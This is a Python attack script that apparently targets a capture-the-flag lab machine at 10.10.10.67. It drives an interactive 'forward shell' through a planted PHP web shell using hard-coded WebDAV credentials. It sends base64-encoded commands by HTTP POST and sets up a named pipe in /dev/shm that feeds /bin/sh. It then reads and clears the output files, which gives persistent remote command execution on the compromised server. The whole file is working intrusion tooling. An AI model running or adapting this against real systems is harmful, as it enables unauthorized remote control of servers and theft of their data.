#!/usr/bin/python3

import requests
import sys
import signal
import pdb
from base64 import b64encode
import random

# ctrl + c
def signal_handler(sig, frame):
    print("\n[!] Exiting...")
    sys.exit(0)
signal.signal(signal.SIGINT, signal_handler)

# Variables globales
main_url = "http://webdav_tester:babygurl69@10.10.10.67/webdav_test_inception/rev.php"
global stdin, stdout
session = random.randrange(1, 9999)
stdin = "/dev/shm/stdin.%s" % session
stdout = "/dev/shm/stdout.%s" % session

# Funciones
def RunCmd(command):

    command = b64encode(command.encode()).decode()
    post_data = {"cmd": "echo %s | base64 -d | bash" % command}
    r = requests.post(main_url, data=post_data, timeout=2)

    return r.text

def WriteCmd(command):

    command = b64encode(command.encode()).decode()
    post_data = {"cmd": "echo %s | base64 -d > %s" % (command, stdin)}
    r = requests.post(main_url, data=post_data, timeout=2)

    return r.text

def ReadCmd():

    ReadTheOutput = """/bin/cat %s""" % stdout
    response = RunCmd(ReadTheOutput)
    return response

def SetupShell():
    NamedPipe = "mkfifo %s; tail -f %s | /bin/sh 2>&1 > %s" % (stdin, stdin, stdout)

    try:
        RunCmd(NamedPipe)
    except:
        None
    return None

SetupShell()

if __name__ == "__main__":

    while True:
        command = input("Shell> ")
        WriteCmd(command + "\n")
        response = ReadCmd()
        print(response)

        ClearTheOutput = """echo '' > %s""" % stdout 
        RunCmd(ClearTheOutput)





